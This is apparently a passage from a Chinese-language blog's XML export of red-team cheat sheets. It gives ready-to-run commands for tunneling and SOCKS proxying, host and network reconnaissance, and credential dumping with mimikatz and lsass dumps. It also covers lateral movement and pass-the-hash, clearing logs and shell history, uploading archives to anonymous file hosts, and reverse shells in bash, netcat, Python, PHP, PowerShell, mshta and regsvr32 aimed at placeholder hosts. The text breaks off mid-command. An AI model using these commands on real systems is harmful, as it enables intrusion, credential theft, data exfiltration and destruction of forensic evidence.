href="https://github.com/fatedier/frp">Frp</a></h3><ul><li>Server端</li></ul><pre class="line-numbers language-INI" data-language="INI"><code class="language-INI">[common]bind_port &#x3D; 7000kcp_bind_port &#x3D; 7000token &#x3D; 随机密码tls_only &#x3D; true</code></pre><ul><li>端口转发</li></ul><pre class="line-numbers language-INI" data-language="INI"><code class="language-INI">#TCP流量 --&gt; Server:3389 --&gt; Client --&gt; Target:22[common]server_addr &#x3D; Serverserver_port &#x3D; 7000token &#x3D; 随机密码tls_enable &#x3D; trueprotocol &#x3D; tcp&#x2F;kcp&#x2F;websocketdisable_custom_tls_first_byte &#x3D; true[HTTP]type &#x3D; tcplocal_ip &#x3D; Targetlocal_port &#x3D; 22remote_port &#x3D; 3389use_compression &#x3D; true</code></pre><ul><li>Socks代理</li></ul><pre class="line-numbers language-INI" data-language="INI"><code class="language-INI">#Socks流量 --&gt; Server:3389 --&gt; Client --&gt; 动态转发[common]server_addr &#x3D; Serverserver_port &#x3D; 7000token &#x3D; 随机密码tls_enable &#x3D; trueprotocol &#x3D; tcp&#x2F;kcp&#x2F;websocketdisable_custom_tls_first_byte &#x3D; true[Socks5]type &#x3D; tcpremote_port &#x3D; 3389plugin &#x3D; socks5plugin_user &#x3D; adminplugin_passwd &#x3D; 99999use_compression &#x3D; true</code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><ul><li>本地转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Local:8080 --&gt; Remote --&gt; Target:8888portfwd add -l 8080 -r Target -p 8888</code></pre><ul><li>远程转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Remote:8080 --&gt; Local --&gt; Target:8888portfwd add -R -p 8080 -L Target -l 8888</code></pre><h3 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h3><ul><li>查看规则</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">netsh interface portproxy show all</code></pre><ul><li>添加规则</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Server:8080 --&gt; Target:8888netsh interface portproxy set v4tov4 listenaddress&#x3D;0.0.0.0 listenport&#x3D;8080 connectaddress&#x3D;Target connectport&#x3D;8888</code></pre><ul><li>删除规则</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">netsh interface portproxy delete v4tov4 listenaddress&#x3D;0.0.0.0 listenport&#x3D;8080</code></pre><h3 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a><a href="https://github.com/jpillora/chisel">Chisel</a></h3><ul><li>本地转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Client:8080 --&gt; Server --&gt; Target:8888chisel server --auth admin:99999 -p 7000chisel client --auth admin:99999 Server:7000 8080:Target:8888</code></pre><ul><li>远程转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Server:8080 --&gt; Client --&gt; Target:8888chisel server --auth admin:99999 -p 7000 --reversechisel client --auth admin:99999 Server:7000 R:8080:Target:8888</code></pre><ul><li>本地Socks</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#Socks流量 --&gt; Client:9999 --&gt; Server --&gt; 动态转发chisel server --auth admin:99999 -p 7000 --socks5chisel client --auth admin:99999 Server:7000 9999:socks</code></pre><ul><li>远程Socks</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#Socks流量 --&gt; Server(127.0.0.1):9999 --&gt; Client --&gt; 动态转发chisel server --auth admin:99999 -p 7000 --reversechisel client --auth admin:99999 Server:7000 R:9999:socks</code></pre><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><ul><li>本地转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; 127.0.0.1:8080 --&gt; Server --&gt; Target:8888ssh -CNf -L 127.0.0.1:8080:Target:8888 root@Server</code></pre><ul><li>远程转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Server:8080 --&gt; Client --&gt; Target:8888ssh -CNf -R 8080:Target:8888 root@Server</code></pre><ul><li>动态转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#Socks流量 --&gt; 127.0.0.1:9999 --&gt; Server --&gt; 动态转发ssh -CNf -D 127.0.0.1:9999 root@Server</code></pre><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><h3 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a><a href="https://github.com/yarrick/iodine">Iodine</a></h3><ul><li>Server端</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">iodined -P 随机密码 172.16.0.0&#x2F;24 microsoft.com</code></pre><ul><li>Client端</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#虚拟网卡 --&gt; DNS流量 --&gt; Server --&gt; 172.16.0.1iodine -r -P 随机密码 [服务端IP] microsoft.com</code></pre><h3 id="Dns2tcp"><a href="#Dns2tcp" class="headerlink" title="Dns2tcp"></a><a href="https://github.com/alex-sector/dns2tcp">Dns2tcp</a></h3><ul><li>Server端</li></ul><pre class="line-numbers language-INI" data-language="INI"><code class="language-INI">#dns2tcpd -f server.configlisten &#x3D; 0.0.0.0port &#x3D; 53user &#x3D; nobodykey &#x3D; 随机密码chroot &#x3D; &#x2F;tmpdomain &#x3D; microsoft.comresources &#x3D; http:Target:8888</code></pre><ul><li>Client端</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; Client:8080 --&gt; DNS流量 --&gt; Server --&gt; Target:8888dns2tcpc -c -l 8080 -z microsoft.com -r http -k 随机密码 [服务端IP]</code></pre><h2 id="HTTP隧道"><a href="#HTTP隧道" class="headerlink" title="HTTP隧道"></a>HTTP隧道</h2><h3 id="ABPTTS"><a href="#ABPTTS" class="headerlink" title="ABPTTS"></a><a href="https://github.com/nccgroup/ABPTTS">ABPTTS</a></h3><ul><li>有效载荷</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">python2 abpttsfactory.py -o server</code></pre><ul><li>端口转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; 127.0.0.1:8080 --&gt; Server --&gt; Target:8888python2 abpttsclient.py -c server&#x2F;config.txt -u http:&#x2F;&#x2F;example.com&#x2F;abptts.jsp -f 127.0.0.1:8080&#x2F;Target:8888</code></pre><h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a><a href="https://github.com/L-codes/Neo-reGeorg/">reGeorg</a></h3><ul><li>有效载荷</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">python3 neoreg.py generate -k 随机密码 --file 404.html --httpcode 404</code></pre><ul><li>端口转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; 127.0.0.1:8080 --&gt; Server --&gt; Target:8888python3 neoreg.py -s -k 随机密码 -u http:&#x2F;&#x2F;example.com&#x2F;tunnel.php -p 8080 -t Target:8888</code></pre><ul><li>Socks代理</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#Socks流量 --&gt; 127.0.0.1:9999 --&gt; Server --&gt; 动态转发python3 neoreg.py -s -k 随机密码 -u http:&#x2F;&#x2F;example.com&#x2F;tunnel.php -l 127.0.0.1 -p 9999</code></pre><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a><a href="https://github.com/esrrhs/pingtunnel">PingTunnel</a></h3><ul><li>Server端</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pingtunnel -type server -key 随机密码 -nolog 1 -noprint 1</code></pre><ul><li>端口转发</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#TCP流量 --&gt; 127.0.0.1:9999 --&gt; Server --&gt; Target:8888pingtunnel -type client -key 随机密码 -l 127.0.0.1:9999 -s Server -t Target:8888 -tcp 1 -nolog 1 -noprint 1</code></pre><ul><li>Socks代理</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#Socks流量 --&gt; 127.0.0.1:9999 --&gt; Server --&gt; 动态转发pingtunnel -type client -key 随机密码 -l 127.0.0.1:9999 -s Server -sock5 1 -nolog 1 -noprint 1</code></pre>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>内网入侵</title><link href="/writings/RedTeam-6/"/><url>/writings/RedTeam-6/</url><content type="html"><![CDATA[<h2 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#系统版本uname -a#开机时间who -r#进程列表ps -aux#历史命令cat ~&#x2F;.*sh_history#本地服务systemctl --type&#x3D;service#判断Dockerls -la &#x2F;.dockerenvcat &#x2F;proc&#x2F;1&#x2F;cgroup | grep docker</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#系统版本systeminfo#进程列表tasklist#全部盘符fsutil fsinfo drives#开机时间net statistics workstation#应用软件wmic product get name,version#本地服务wmic service get name,pathname,startmode#启动程序wmic startup get caption,command,location#PowerShell历史type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#在线用户w || who#用户列表cat &#x2F;etc&#x2F;passwd | grep &#x2F;bin&#x2F;bash#管理员组cat &#x2F;etc&#x2F;passwd | awk -F: &quot;\$3&#x3D;&#x3D;0&quot;</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#用户列表net user#在线用户query user#用户权限whoami &#x2F;all#管理员组net localgroup Administrators</code></pre><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#ARP缓存arp -a#网络配置ifconfig#路由信息route -n#端口连接netstat -pantu#Hosts文件cat &#x2F;etc&#x2F;hosts#代理配置env | grep -i proxy</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#ARP缓存arp -a#共享列表net share#路由信息route print#端口连接netstat -nao#网络配置ipconfig &#x2F;all#DNS缓存ipconfig &#x2F;displaydns#Hosts文件type C:\Windows\System32\drivers\etc\hosts#代理配置reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; &#x2F;v Proxy*</code></pre><h3 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#SSH端口grep -Ei &quot;Port [0-9]+&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config#SSH日志last | grep -Eo &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | sort -u#SSH历史find &#x2F; -name known_hosts | xargs grep -Eho &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | sort -u</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#RDP启用wmic RDTOGGLE where ServerName&#x3D;&quot;%COMPUTERNAME%&quot; call SetAllowTSConnections 1reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f#RDP端口reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber#RDP历史Get-ChildItem &#39;Registry::HKEY_USERS\*\Software\Microsoft\Terminal Server Client\Servers\*&#39; 2&gt; $null#RDP日志Get-EventLog Security -InstanceId 4624 | ?&#123;$_.Message -match &#39;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&#39;&#125; | %&#123;$Matches.Values&#125; | Sort -Unique</code></pre><h3 id="防-nbsp-nbsp-火-nbsp-nbsp-墙"><a href="#防-nbsp-nbsp-火-nbsp-nbsp-墙" class="headerlink" title="防&nbsp;&nbsp;火&nbsp;&nbsp;墙"></a>防&nbsp;&nbsp;火&nbsp;&nbsp;墙</h3><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#查看状态netsh advfirewall show allprofiles#关闭服务netsh firewall set opmode mode&#x3D;disablenetsh advfirewall set allprofiles state off#端口放行netsh firewall add portopening name&#x3D;&quot;RDP&quot; mode&#x3D;enable protocol&#x3D;TCP port&#x3D;3389netsh advfirewall firewall add rule name&#x3D;&quot;RDP&quot; dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP localport&#x3D;3389#程序放行netsh firewall add allowedprogram name&#x3D;&quot;File&quot; mode&#x3D;enable program&#x3D;&quot;C:\File.exe&quot;netsh advfirewall firewall add rule name&#x3D;&quot;File&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C:\File.exe&quot;</code></pre><h2 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h2><h2 id="凭证收集"><a href="#凭证收集" class="headerlink" title="凭证收集"></a>凭证收集</h2><h3 id="WiFi密码"><a href="#WiFi密码" class="headerlink" title="WiFi密码"></a>WiFi密码</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cd &#x2F;etc&#x2F;NetworkManager&#x2F;system-connections &amp;&amp; grep -rH &quot;psk&#x3D;&quot; | sed &quot;s&#x2F;psk&#x3D;&#x2F;&#x2F;&quot;</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">netsh wlan show profile name&#x3D;&quot;WIFI名称&quot; key&#x3D;clear</code></pre><h3 id="Web数据"><a href="#Web数据" class="headerlink" title="Web数据"></a>Web数据</h3><ul><li><a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">hack-browser-data -b all -f csv --cc --dir Temp</code></pre><h3 id="Hash凭证"><a href="#Hash凭证" class="headerlink" title="Hash凭证"></a>Hash凭证</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cat &#x2F;etc&#x2F;shadow | awk -F: &quot;length(\$2)&gt;3&quot;</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#Mimikatzmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;#Reg+Mimikatzreg save HKLM\SAM SAM.hivereg save HKLM\SYSTEM SYSTEM.hivemimikatz &quot;lsadump::sam &#x2F;sam:SAM.hive &#x2F;system:SYSTEM.hive&quot; &quot;exit&quot;#ProcDump+MimikatzProcDump.exe -accepteula -ma lsass.exe lsass.dmpmimikatz &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;#开启Wdigest Authreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</code></pre><h2 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h2><h3 id="Ping存活"><a href="#Ping存活" class="headerlink" title="Ping存活"></a>Ping存活</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">echo 192.168.0.&#123;1..254&#125; | xargs -n1 -P 10 ping -w 1 -c 1 | grep -i TTL | grep -Eo &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">for &#x2F;L %I in (1, 1, 254) do @ping -w 1 -n 1 192.168.0.%I | findstr &#x2F;I &quot;TTL&quot;</code></pre><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>Linux</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">for IP in 192.168.0.&#123;1..254&#125;; do echo -n &quot;22,80,443,3389&quot; | xargs -P 10 -d &quot;,&quot; -i timeout 1 bash -c &quot;echo &gt;&#x2F;dev&#x2F;tcp&#x2F;$IP&#x2F;&#123;&#125; &amp;&amp; echo &#39;$IP:&#123;&#125; open&#39;&quot; 2&gt;&#x2F;dev&#x2F;null; done</code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">ForEach($IP in (1..254|%&#123;&#39;192.168.1.&#39;+$_&#125;))&#123;ForEach($Port in 22,80,443,3389)&#123;$TCP&#x3D;New-Object Net.Sockets.TcpClient;if($TCP.BeginConnect($IP,$Port,$NULL,$NULL).AsyncWaitHandle.WaitOne(300,$False))&#123;$IP+&#39;:&#39;+$Port+&#39; open&#39;&#125;$TCP.Close()&#125;&#125;</code></pre><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="IPC-管道"><a href="#IPC-管道" class="headerlink" title="IPC$管道"></a>IPC$管道</h3><ul><li>IPC</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">net use \\192.168.0.1\IPC$ Password &#x2F;user:Domain\Usernet use \\192.168.0.1\IPC$ &#x2F;del</code></pre><ul><li>Sc</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">sc \\192.168.0.1 create 服务名称 binPath&#x3D; &quot;执行命令&quot;sc \\192.168.0.1 start  服务名称sc \\192.168.0.1 delete 服务名称</code></pre><ul><li>WMI</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">wmic &#x2F;node:192.168.0.1 &#x2F;user:User &#x2F;password:Password process call create &quot;执行命令&quot;</code></pre><ul><li>PsExec</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">psexec -accepteula \\192.168.0.1 -u User -p Password -s &quot;执行命令&quot;</code></pre><ul><li>WinRM</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">winrs -r:http:&#x2F;&#x2F;192.168.0.1:5985 -u:User -p:Password &quot;执行命令&quot;</code></pre><ul><li>Schtasks</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">schtasks &#x2F;create &#x2F;s 192.168.0.1 &#x2F;u User &#x2F;p Password &#x2F;tn 任务名称 &#x2F;ru SYSTEM &#x2F;sc onCE &#x2F;st 12:00 &#x2F;tr &quot;执行命令&quot;schtasks &#x2F;run &#x2F;s 192.168.0.1 &#x2F;u User &#x2F;p Password &#x2F;tn 任务名称 &#x2F;ischtasks &#x2F;delete &#x2F;s 192.168.0.1 &#x2F;u User &#x2F;p Password &#x2F;tn 任务名称 &#x2F;f</code></pre><h3 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h3><ul><li>Mimikatz</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#PTKmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; &quot;exit&quot;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WORKGROUP &#x2F;aes256:32ed87bdb5fdc5e9cba88547376818d4&quot; &quot;exit&quot;#PTHmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WORKGROUP &#x2F;ntlm:32ed87bdb5fdc5e9cba88547376818d4&quot; &quot;exit&quot;#RDPreg add HKLM\System\CurrentControlSet\Control\Lsa &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;fmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WORKGROUP &#x2F;ntlm:32ed87bdb5fdc5e9cba88547376818d4 \&quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin\&quot;&quot; &quot;exit&quot;</code></pre><h3 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h3><h3 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h3>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>痕迹清除</title><link href="/writings/RedTeam-7/"/><url>/writings/RedTeam-7/</url><content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul><li>历史命令</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#不记录历史命令unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE&#x3D;&#x2F;dev&#x2F;null; export HISTSIZE&#x3D;0; export HISTFILESIZE&#x3D;0#删除第N到最后一行sed -i &#39;N,$d&#39; .*sh_history</code></pre><ul><li>日志记录</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">#SSH隐身登录ssh root@x.x.x.x -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T &#x2F;bin&#x2F;sh -i#替换匹配内容grep -alr &#39;8.8.8.8&#39; &#x2F;var&#x2F;log | xargs sed -i &#39;s&#x2F;8.8.8.8&#x2F;114.114.114.114&#x2F;g&#39;#删除匹配行grep -alr &#39;8.8.8.8&#39; &#x2F;var&#x2F;log | xargs sed -i &#39;&#x2F;8.8.8.8&#x2F;d&#39;</code></pre><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul><li>历史命令</li></ul><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">#低版本PSClear-History#高版本PSRemove-Item (Get-PSReadlineOption).HistorySavePath</code></pre><ul><li>日志记录</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">wevtutil cl &quot;System&quot;wevtutil cl &quot;Security&quot;wevtutil cl &quot;Application&quot;wevtutil cl &quot;Windows PowerShell&quot;</code></pre><ul><li>最近访问</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">del &#x2F;f &#x2F;s &#x2F;q %APPDATA%\Microsoft\Windows\Recent</code></pre>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>奇技淫巧</title><link href="/writings/RedTeam-8/"/><url>/writings/RedTeam-8/</url><content type="html"><![CDATA[<h2 id="简单服务"><a href="#简单服务" class="headerlink" title="简单服务"></a>简单服务</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">python -m pyftpdlib -w</code></pre><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">python -m dnslib.intercept</code></pre><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">php -S 0.0.0.0:8000python2 -m SimpleHTTPServerpython3 -m http.server 8000</code></pre><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><ul><li>Bash</li></ul><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">echo Base64 | base64 -d &gt; File</code></pre><ul><li>Certutil</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">echo Base64 &gt; Temp &amp;&amp; certutil -f -decode Temp File</code></pre><ul><li>PowerShell</li></ul><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">[IO.File]::WriteAllBytes(&#39;%TEMP%\File&#39;,[Convert]::FromBase64String(&#39;Base64&#39;))</code></pre><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><ul><li>Curl</li></ul><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">curl -kL http:&#x2F;&#x2F;example.com&#x2F;File -o File</code></pre><ul><li>Wget</li></ul><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">wget --no-check-certificate http:&#x2F;&#x2F;example.com&#x2F;File -O File</code></pre><ul><li>Certutil</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">certutil -urlcache -split -f http:&#x2F;&#x2F;example.com&#x2F;File Filecertutil -urlcache -split -f http:&#x2F;&#x2F;example.com&#x2F;File delete</code></pre><ul><li>Bitsadmin</li></ul><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">bitsadmin &#x2F;transfer job http:&#x2F;&#x2F;example.com&#x2F;File %TEMP%\File</code></pre><ul><li>PowerShell</li></ul><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;example.com&#x2F;File&#39;,&#39;File&#39;)</code></pre><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><ul><li>Curl</li></ul><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">tar -zcvf &#x2F;tmp&#x2F;File.tar.gz -P &#x2F;var&#x2F;www&#x2F;htmlcurl -F &quot;file&#x3D;@&#x2F;tmp&#x2F;File.tar.gz&quot; https:&#x2F;&#x2F;file.io &gt; info.jsoncurl -F &quot;file&#x3D;@&#x2F;tmp&#x2F;File.tar.gz&quot; https:&#x2F;&#x2F;api.anonfiles.com&#x2F;upload &gt; info.json</code></pre><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">php -r &#39;$sock&#x3D;fsockopen(&quot;x.x.x.x&quot;,yyyy); exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;yyyy 0&gt;&amp;1</code></pre><h3 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">rm &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc x.x.x.x yyyy &gt; &#x2F;tmp&#x2F;f</code></pre><h3 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">mshta http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.hta</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">python -c &#39;import os, socket, subprocess; s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&quot;x.x.x.x&quot;, yyyy)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-i&quot;])&#39;</code></pre><h3 id="Msiexec"><a href="#Msiexec" class="headerlink" title="Msiexec"></a>Msiexec</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.msi</code></pre><h3 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.sct scrobj.dll</code></pre><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">powershell -nop -c &quot;$TCP &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;x.x.x.x&#39;, yyyy); $CMD &#x3D; $TCP.GetStream(); [byte[]]$Bytes &#x3D; 0..65535 | % &#123; 0 &#125;; while (($I &#x3D; $CMD.Read($Bytes, 0, $Bytes.Length)) -ne 0) &#123;$Send &#x3D; [Text.Encoding]::ASCII.GetBytes((iex(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes, 0, $I) 2&gt;&amp;1 | Out-String) + (PWD).Path + &#39;&gt; &#39;); 